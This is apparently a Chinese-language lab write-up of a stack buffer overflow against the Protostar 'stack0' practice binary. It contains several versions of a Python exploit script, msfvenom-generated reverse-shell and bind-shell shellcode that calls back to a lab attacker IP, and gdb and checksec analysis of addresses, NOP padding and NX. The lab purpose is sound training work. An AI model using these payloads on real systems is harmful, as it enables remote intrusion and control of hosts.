python -c &#39;print &quot;a&quot;*80+&quot;bbcc&quot;&#39; | ./stack0
------------------output:--------------------
[New LWP 11928]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x63636262 in ?? ()
---------------------end---------------------

最后的&quot;bbcc&quot;由于在内存中依次由上到下存放在栈空间中(在一个栈单元中可放下4个字符,在一个栈单元中从左到右存放),而栈中由上到下或一个栈单元中的从左到右都是由内存低地址到内存高地址排列,所以bbcc(0x62626363)被翻译成eip=0x63636262

为了溢出反弹一个shell,用msf生成shellcode,并构造成如下输入链来触发shellcode的执行
&quot;a&quot;*80+addr(jmp esp)+shellcode
其中shellcode代码由msf生成,输出为py版本,反弹ip设为kali的ip:192.168.3.106,port为1111
2004 ~  » msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.3.106 LPORT=1111 -e x86/shikata_ga_nai -b &quot;\x00&quot; --platform linux -f py 
-------------------------output:-----------------------
No Arch selected, selecting Arch: x86_64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
buf =  &quot;&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;
-------------------------end--------------------------

其中jmp esp的地址由msfelfscan找出,win下为msfpescan
msfelfscan -j esp /root/桌面/stack0
结果发现由于stack0的代码比较简单,里面没有jmp esp的指令,于是通过info shared来找出stack0中调用系统函数时用到的so文件,然后从so文件里找出jmp esp的地址,如下:
info shared
------------output:----------------
From        To          Syms Read   Shared Object Library
0xf7fdd860  0xf7ff50fc  Yes (*)     /lib/ld-linux.so.2     #0xf7fdd860为该动态链接库的内存加载基址
                        No          linux-gate.so.1
0xf7e14420  0xf7f44c0e  Yes (*)     /lib/i386-linux-gnu/i686/cmov/libc.so.6
(*): Shared library is missing debugging information.
--------------end------------------

然后执行msfelfscan -j esp /lib/ld-linux.so.2
----------output:-------------
[/lib/ld-linux.so.2]
0x0001813b jmp esp
0x0001bfe7 jmp esp
0x0001c24f jmp esp
------------end---------------

找到一个jmp esp地址为:0x0001813b,但是这只是偏移量
真正的地址为:0xf7fdd860+0x0001813b=0xf7ff599b

于是输入链为:
&quot;a&quot;*80+&#39;\x9b\x59\xff\xf7&#39;+shellcode
用python代码实现exploit.py:
------------exploit.py----------------
import os
import sys
buf =  &quot;&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;

jmp_esp=&quot;\x9b\x59\xff\xf7&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
#print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
---------------end--------------------

发现上面算出来的jmp_esp=&#39;\x9b\x59\xff\xf7&#39;无法跳转到esp,可能是我的这种理解错了
换工具,rop-tool
http://www.freebuf.com/sectool/105715.html
先安装上面链接中说的capstone
http://www.capstone-engine.org/download/3.0.4/ubuntu-14.04/python-capstone_3.0.4-0.1ubuntu1_amd64.deb
然后下载rop-tool
https://t0x0sh.org/rop-tool/releases/2.4/rop-tool-Linux-x86_64
chmod +x rop-tool-Linux-x86_64
mv rop-tool-Linux-x86_64 /usr/bin/rop
rop gadget ./stack0(或者rop gadget -a ./stack0)
------------------output:--------------------
Looking gadgets, please wait...
 0x080482e5 -&amp;gt; add dword ptr [eax], eax; add byte ptr [eax + 0x5b], bl; leave ; ret ; 
 0x080482ca -&amp;gt; ret ; 
 0x08048440 -&amp;gt; push ebp; mov ebp, esp; pop ebp; ret ; 
 0x080483ef -&amp;gt; call eax; leave ; ret ; 
 0x080482e9 -&amp;gt; pop ebx; leave ; ret ; 
 0x080484a7 -&amp;gt; pop edi; pop ebp; ret ; mov ebx, dword ptr [esp]; ret ; 
 0x080482c5 -&amp;gt; add byte ptr [eax], al; add byte ptr [ebx - 0x7f], bl; ret ; 
 0x080484a7 -&amp;gt; pop edi; pop ebp; ret ; 
 0x080484f4 -&amp;gt; pop ecx; pop ebx; leave ; ret ; 
 0x080483b9 -&amp;gt; add eax, 0x8049644; add dword ptr [ebx + 0x5d5b04c4], eax; ret ; 
 0x080484a8 -&amp;gt; pop ebp; ret ; mov ebx, dword ptr [esp]; ret ; 
 0x080483ef -&amp;gt; call eax; 
 0x080484a5 -&amp;gt; pop ebx; pop esi; pop edi; pop ebp; ret ; 
 0x080482ea -&amp;gt; leave ; ret ; 
 0x080483c3 -&amp;gt; pop ebp; ret ; 
 0x080483c2 -&amp;gt; pop ebx; pop ebp; ret ; 
 0x080482e6 -&amp;gt; add byte ptr [eax], al; pop eax; pop ebx; leave ; ret ; 
 0x080482e7 -&amp;gt; add byte ptr [eax + 0x5b], bl; leave ; ret ; 
 0x080482e8 -&amp;gt; pop eax; pop ebx; leave ; ret ; 
 0x080484aa -&amp;gt; mov ebx, dword ptr [esp]; ret ; 
 0x080482c7 -&amp;gt; add byte ptr [ebx - 0x7f], bl; ret ; 
 0x080484a9 -&amp;gt; ret ; mov ebx, dword ptr [esp]; ret ; 
 0x080483be -&amp;gt; add dword ptr [ebx + 0x5d5b04c4], eax; ret ; 
 0x08048432 -&amp;gt; dec ecx; ret ; 
 0x08048441 -&amp;gt; mov ebp, esp; pop ebp; ret ; 
 0x080484a6 -&amp;gt; pop esi; pop edi; pop ebp; ret ; 
---------------------end---------------------

里面没有找到jmp esp,不理解为什么不搜索系统加载到内存的动态链接库so文件里的jmp esp,暂且不管这个问题
没有找到jmp esp,rop gadget这个功能主要是搜索用来获得ret2libc构造链中的子语句的功能,特点是每个gadget都是以ret结尾的一条或几条汇编小指令
换工具edb-debugger,kali自带,将stack0拖入edb,快捷键ctrl+o,或者从plugins选项中选择opcodesearcher工具(里面也有roptool,功能类似上面的rop-tool工具的功能,edb-debugger中的toptool功能可以看到系统内存已经加载的动态链接库列表,而上面freebuf中提到的rop-tool不能)
搜到jmp esp地址如下(由于本机kali为64位,所以显示成下图中样式,取其中32位的地址即可)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/opcodesearcher.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;取其中的0xf773813b,替换exploit.py中jmp_esp=&quot;\x3b\x81\x73\xf7&quot;,上图中选择的/lib/i386-linux-gnu/ld-2.19.so应该是随着操作系统启动加载到系统内存中的可用动态链接库文件

运行exploit.py,结果依然不行,这个jmp_esp还是没有被执行,可能是没有找到这个地址,不理解,暂且不管这个问题
python exploit.py
----------------outpout:------------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�A&amp;gt;4P���do&amp;lt;$3ɱ1U�da��N&amp;gt;ʪ���SF
         91!z�ik\Dz��5�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
┌─[root@x0day] - [~/桌面] - [Mon Jun 06, 07:53]
└─[$] &amp;lt;&amp;gt; gdb -q -c core 
[New LWP 7435]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xf773813b in ?? ()
(gdb) disas 0xf773813b
No function contains specified address.
-----------------end----------------------

无法有效利用jmp esp的方法,直接在main_ret位置上填充紧跟其后的shellcode的开始的地址,也即address(main_ret位置在内存中的地址0xffffd4fc)+0x4的结果:

shellcode_addr=0xffffd500

由于有00,在调用gets时系统复制从终端输入的超长字符串会提前停止,所以不能取0xffffd500,取成0xffffd501,在原来shellcode前面加一个nop(\x90),重新构造输入链:
&quot;a&quot;*80+&quot;\x01\xd5\ff\xff&quot;+&quot;\x90&quot;+shellcode
将exploit.py中jmp_esp替换为jmp_esp=&quot;\x01\xd5\xff\xff&quot;,并在shellcode前面加一个&quot;\x90&quot;,新的exploit.py如下:
------------------------exploit.py-------------------------------
#/usr/bin/python
import os
import sys
buf =  &quot;\x90&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;

jmp_esp=&quot;\x01\xd5\xff\xff&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
----------------------------end----------------------------------

结果依然失败
-----------------output:---------------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���1o&amp;lt;$3ɱ1U�da��N&amp;gt;ʪ����A&amp;gt;4P���d
         91!z�ik\Dz��5�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
┌─[root@x0day] - [~/桌面] - [Mon Jun 06, 08:33]
└─[$] &amp;lt;&amp;gt; gdb -q -c core 
[New LWP 32688]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffffd501 in ?? ()
------------------end------------------------

重新运行./stack0,手工输入:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
其中1234对应为main_ret位置,bbbb为原来的shellcode位置
产生core文件后
gdb -q -c core
--------output:---------
[New LWP 25058]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x34333231 in ?? ()
---------end------------

x/4 $esp
------output:---------
0xff85ffc0:     0x62626262      0xff860000      0xff86005c      0xf77e679a
-------end------------

x/4 $esp-4
------output:---------
0xff85ffbc:     0x34333231      0x62626262      0xff860000      0xff86005c
--------end-----------

易知从这里(core)看到的shellcode开始的位置应该从0xff85ffc0开始(上面exploit.py中不在shellcode前加nop时使用的地址是0xffffd500)
而0xff85ffc0中没有\x00不影响直接执行shellcode,不加nop,构造成如下输入链:
&quot;a&quot;*80+&quot;\xc0\xff\x85\xff&quot;+shellcode
在exploit.py中具体如下:
-----------------exploit.py-------------------
#/usr/bin/python
import os
import sys
buf =  &quot;&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;

jmp_esp=&quot;\xc0\xff\x85\xff&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
-------------------end0-----------------------

python exploit.py
-----------output:--------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�����1o�A&amp;gt;4P���d��N&amp;gt;ʪ���SF
         91!z�ik\Dz��5�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
------------end-----------------

gdb -q -c core
-------------output:---------------
[New LWP 2220]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xff85ffc0 in ?? ()
---------------end-----------------

依然在新的0xff85ffc0无法执行
x/40x $esp-4
----------output:------------
0xffe11e0c:     0xff85ffc0      0x3c6f31ba      0xd9cad905      0x5df42474
----------end----------------

可以看到此时应该将0xff85ffc0改成0xffe11e0c+0x4=0xffe11e10才会执行后面的shellcode(内容从0x3c6f31ba开始)
说明shellcode每次在内存中的位置都是变化的
后来又发现下面三种方法特点不同:
方法1:
    gdb ./stack0
    人工输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
    每次shellcode的位置(bbbb处)在内存中的地址都是0xffffd500
方法2:
    ./stack0
    人工输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
    gdb -q -c core
    从core文件中发现每次shellcode的位置(bbbb处)在内存中的地址都是变化的
方法3:
    vi exploit.py
    ------------exploit.py--------------
    #/usr/bin/python
    import os
    import sys
    buf =  &quot;&quot;
    buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
    buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
    buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
    buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
    buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
    buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
    buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
    buf += &quot;\x8b\xf4\xbe\x2c&quot;
    
    jmp_esp=&quot;some addr&quot;
    #print jmp_esp
    input=&quot;a&quot;*80+jmp_esp+buf
    print input
    os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
    ---------------end------------------

    gdb -q -c core
    从core文件中分析出的shellcode的位置(\xba\x31\x6f\x3c开始)都是变化的

通过这三种不同情况得出结论:
    1.linux的真实情况是每次shellcode在内存中的地址是变化的
    2.不能gdb ./stack0来看shellcode的内存地址,要通过gdb -q -c core来分析出系统运行./stack0时的真实情况,方法2和3都可行
    3.gdb ./stack0时,可能是系统判断有人在调度,所以故意让shellcode的内存地址每次都不变,用来干扰判断
    4.想直接在&quot;a&quot;*80+&quot;1234&quot;+&quot;bbbb&quot;中的1234的位置上写入shellcode的起始地址是行不能的,只能用jmp esp或其他方法

突然想到,在edb-debugger工具中找到的jmp esp的地址放入exploit.py中的jmp_esp中最后没有成功有可能是因为kali的安全防护功能,其中的系统内存中加载的/lib/i386-linux-gnu/ld-2.19.so有安全设置
下载checksec.sh检查一下:http://www.trapkit.de/tools/checksec.sh(或者peda工具,https://github.com/3xp10it/peda)
chmod +x ./checksec.sh
./checksec.sh --file /lib/i386-linux-gnu/ld-2.19.so
-------------output:----------------
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    DSO             No RPATH   No RUNPATH   /lib/i386-linux-gnu/ld-2.19.so
---------------end------------------

其中的NX enabled可以看出的确是这个原因
检查下./stack0:
发现也是NX enabled,这个stack0应该是我在kali上用gcc -g -o stack0 stack0.c编译出来的,默认有安全防护
复制原系统protostar中的/opt/protostar/bin/stack0到kali中
scp user:192.168.2.144:/opt/protostar/bin/stack0 /root/桌面
./checksec.sh --file stack0
-----------output:-----------
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   stack0
-------------end-------------

这个才是原题protostar系统中的stack0,但是原系统中(protostar)溢出时无法产生core文件,无法分析执行时的shellcode和main_ret地址
无法产生core文件应该是由于protostar默认的user用户的权限对suid=root的/opt/protostar/bin/stack0文件权限不足以在发生溢出时产生core文件

解决方法:
cp /opt/protostar/bin/stack0 /tmp
这样/tmp/stack0就是user用户的文件了,溢出时可以正常产生core文件,但是没有原来/opt/protostar/bin/stack0的suid=root属性
开始一直是通过ssh user@192.168.2.144到protostar系统进行远程操作的,后来发现ssh登录时和直接在protostar系统中操作时不同,这两种情况下运行:
python exploit.py
在内存中分配的地址不同

ssh user@192.168.2.144时shellcode的内存地址为0xbffff790
直接在protostar虚拟机中操作时shellcode的内存地址为0xbffff880

后来以改为直接在protostar系统中操作,将jmp_esp的值改为&quot;\x80\xf8\xff\xbf&quot;
重新由下面语句生成shellcode,由原来的x64改成x86,LPORT改成2222(kali为64位系统,protostar为32位系统)

msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.3.106 LPORT=2222 -b &quot;\x00&quot; -f py
exploit.py代码如下:
-------------------exploit.py-----------------------
#/usr/bin/python
import os
import sys

buf =  &quot;&quot;
buf += &quot;\xd9\xf6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x12\xbb\xbe&quot;
buf += &quot;\x35\xbf\xc5\x31\x5e\x1a\x83\xc6\x04\x03\x5e\x16\xe2&quot;
buf += &quot;\x4b\x04\x64\x32\x50\x34\xd9\xee\xfc\xb9\x6d\x76\x89&quot;
buf += &quot;\x5f\x40\xf7\x1e\xc4\x33\x38\x88\xf8\xa9\xd0\xca\xfe&quot;
buf += &quot;\x25\x8f\x43\x1f\x5f\xa9\x0b\xb0\xf1\x62\x22\xd1\xb1&quot;
buf += &quot;\x41\xb4\xa0\x31\xe3\xb4\xd4\x3d\x13\x3d\x37\xfc\xf8&quot;
buf += &quot;\x31\x79\x1c\xf2\xf9\x04\x2e\x8b\xa2\x7f\x51\x15\xe2&quot;
buf += &quot;\x8c\x22\x25\xc7\x0d\xbd\xcb&quot;

jmp_esp=&quot;\x70\xf8\xff\xbf&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
-----------------end--------------------------------

发现还是无法反弹shell,于是在shellcode前加一串nop试试,发现加9个以上的nop(\x90)可以成功反弹shell
加上nop后代码如下:
----------------------exploit.py--------------------------
#/usr/bin/python
import os
import sys

buf =  &quot;\x90&quot;*9
buf += &quot;\xd9\xf6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x12\xbb\xbe&quot;
buf += &quot;\x35\xbf\xc5\x31\x5e\x1a\x83\xc6\x04\x03\x5e\x16\xe2&quot;
buf += &quot;\x4b\x04\x64\x32\x50\x34\xd9\xee\xfc\xb9\x6d\x76\x89&quot;
buf += &quot;\x5f\x40\xf7\x1e\xc4\x33\x38\x88\xf8\xa9\xd0\xca\xfe&quot;
buf += &quot;\x25\x8f\x43\x1f\x5f\xa9\x0b\xb0\xf1\x62\x22\xd1\xb1&quot;
buf += &quot;\x41\xb4\xa0\x31\xe3\xb4\xd4\x3d\x13\x3d\x37\xfc\xf8&quot;
buf += &quot;\x31\x79\x1c\xf2\xf9\x04\x2e\x8b\xa2\x7f\x51\x15\xe2&quot;
buf += &quot;\x8c\x22\x25\xc7\x0d\xbd\xcb&quot;

jmp_esp=&quot;\x70\xf8\xff\xbf&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
------------------------end-------------------------------

而经检验并不是shellcode在内存中的位置(0x0xbffff880)定位不准的问题,应该是由于以下原因造成:

上面msfvenom生成shellcode时,由于加了-b &quot;\x00&quot;参数,msfvenom默认用x86/shikata_ga_nai编码器编码,解码过程需要shellcode前面有一些空间(这里是9个字节大小的空间)用来帮助完成shellcode的解码过程
shellcode前面加上9个以上的nop后shellcode顺利的完成了解码,反弹了shell(本地事先用相同的payload+multi/handler监听,如果用nc -lvp 2222来监听不能建立shell的连接,用nc -lvp只能看到connect,然后就断了)
但是由于protostar系统是个liveCD系统,反弹的shell连上以后马上会断,应该是由于&quot;光盘&quot;特殊的原因
这样看来,并不是msf产生的shellcode就是毋庸置疑完全可靠的,前面竟要9个以上的空间才可支持其解码后顺利运行

用同样的方法在kali上尝试溢出反弹shell,将protostar系统中的stack0复制到kali上
scp user@192.168.3.105:/opt/protostar/bin/stack0 /root/桌面
用msfvenom重新生成shellcode:

msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.3.106 LPORT=2222 -b &quot;\x00&quot; -f py
-------------------------output:-------------------------
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86_64 from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
buf =  &quot;&quot;
buf += &quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
buf += &quot;\xef\xff\xff\xff\x48\xbb\x53\xdd\xa7\x9c\xa2\x89\xbe&quot;
buf += &quot;\x05\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
buf += &quot;\x39\xf4\xff\x05\xc8\x8b\xe1\x6f\x52\x83\xa8\x99\xea&quot;
buf += &quot;\x1e\xec\xc2\x57\xf9\xa5\x9c\xaa\x27\xf6\x8c\xb5\xb7&quot;
buf += &quot;\xb7\xc6\xc8\xb8\xe6\x0a\x56\x84\xcd\xae\xfa\x86\xbb&quot;
buf += &quot;\x4d\xc5\xb7\x8c\xc4\xad\x8c\xee\x53\x0c\xb7\xae\xc4&quot;
buf += &quot;\x3b\x3f\xae\x4d\xda\x0b\xea\xad\x6b\xe3\x9c\x44\x09&quot;
buf += &quot;\x6f\xa0\x93\xa7\xc1\x28\x4d\xc4\x82\xa8\x99\x5d\x6f&quot;
buf += &quot;\xbe\x05&quot;
--------------------------end----------------------------

此时exploit.py如下:

---------------------exploit.py------------------------
#/usr/bin/python
import os
import sys

buf =  &quot;bbbb&quot;
buf += &quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
buf += &quot;\xef\xff\xff\xff\x48\xbb\x53\xdd\xa7\x9c\xa2\x89\xbe&quot;
buf += &quot;\x05\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
buf += &quot;\x39\xf4\xff\x05\xc8\x8b\xe1\x6f\x52\x83\xa8\x99\xea&quot;
buf += &quot;\x1e\xec\xc2\x57\xf9\xa5\x9c\xaa\x27\xf6\x8c\xb5\xb7&quot;
buf += &quot;\xb7\xc6\xc8\xb8\xe6\x0a\x56\x84\xcd\xae\xfa\x86\xbb&quot;
buf += &quot;\x4d\xc5\xb7\x8c\xc4\xad\x8c\xee\x53\x0c\xb7\xae\xc4&quot;
buf += &quot;\x3b\x3f\xae\x4d\xda\x0b\xea\xad\x6b\xe3\x9c\x44\x09&quot;
buf += &quot;\x6f\xa0\x93\xa7\xc1\x28\x4d\xc4\x82\xa8\x99\x5d\x6f&quot;
buf += &quot;\xbe\x05&quot;

jmp_esp=&quot;\xff\x48\x87\xa0&quot;    #此处jmp_esp暂时不确定
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
-----------------------end-----------------------------

尝试通过shellcode前面加上标志&quot;bbbb&quot;找出shellcode在内存中的固定地址,其中上面jmp_esp的值为随意填写的一个

python exploit.py
--------------output:-----------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�H��bbbbH1����H���H�Sݧ����H1X&#39;H-����9ȋR���W����&#39;������
                              V�ͮ���Mŷ�ĭ�
                                        ��?�M   o����(MĂ��]o�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
----------------end-------------------

gdb -q -c core
---------------output:------------------
[New LWP 24384]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xa08748ff in ?? ()
-----------------end--------------------

x/10x $esp
----------output:-----------
0xffd26180:     0x62626262      0x48c93148      0xfff6e981      0x8d48ffff
0xffd26190:     0xffffef05      0x53bb48ff      0xa29ca7dd      0x4805be89
0xffd261a0:     0x2d485831      0xfffffff8
-----------end--------------
由此看出shellcode在内存的地址应该写成0xffd26180,也即jmp_esp=&quot;\x80\x61\xd2\xff&quot;,并将&quot;bbbb&quot;换成&quot;\x90&quot;*9,修改exploit.py如下:
--------------------exploit.py-------------------
#/usr/bin/python
import os
import sys

buf =  &quot;\x90&quot;*9
buf += &quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
buf += &quot;\xef\xff\xff\xff\x48\xbb\x53\xdd\xa7\x9c\xa2\x89\xbe&quot;
buf += &quot;\x05\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
buf += &quot;\x39\xf4\xff\x05\xc8\x8b\xe1\x6f\x52\x83\xa8\x99\xea&quot;
buf += &quot;\x1e\xec\xc2\x57\xf9\xa5\x9c\xaa\x27\xf6\x8c\xb5\xb7&quot;
buf += &quot;\xb7\xc6\xc8\xb8\xe6\x0a\x56\x84\xcd\xae\xfa\x86\xbb&quot;
buf += &quot;\x4d\xc5\xb7\x8c\xc4\xad\x8c\xee\x53\x0c\xb7\xae\xc4&quot;
buf += &quot;\x3b\x3f\xae\x4d\xda\x0b\xea\xad\x6b\xe3\x9c\x44\x09&quot;
buf += &quot;\x6f\xa0\x93\xa7\xc1\x28\x4d\xc4\x82\xa8\x99\x5d\x6f&quot;
buf += &quot;\xbe\x05&quot;

jmp_esp=&quot;\x80\x61\xd2\xff&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
----------------------end------------------------

重新运行:
python exploit.py
----------------output:-------------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�a���������H1����H���H�Sݧ����H1X&#39;H-����9ȋR���W����&#39;������
                                 V�ͮ���Mŷ�ĭ�
                                           ��?�M        o����(MĂ��]o�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
------------------end---------------------

本机用相同的payload+multi/handler执行exploit无法获得shell
分析core
gdb -q -c core
-----------------output:--------------------
[New LWP 24746]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffd26180 in ?? ()
-------------------end----------------------

x/10x $esp
----------output:-------------
0xffa14160:     0x90909090      0x90909090      0xc9314890      0xf6e98148
0xffa14170:     0x48ffffff      0xffef058d      0xbb48ffff      0x9ca7dd53
0xffa14180:     0x05be89a2      0x48583148
-------------end--------------

从中发现这时shellcode的内存地址又变成了0xffa14160(上面[esp]后紧接的9个90证明了这点),不再是0xffd26180,可以看出kali的内存中没有固定的shellcode地址,每次shellcode地址都会变化,这应该是由于kali的内核版本高,安全性好造成的

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sat, 04 Jun 2016 00:00:00 +0800</pubDate>
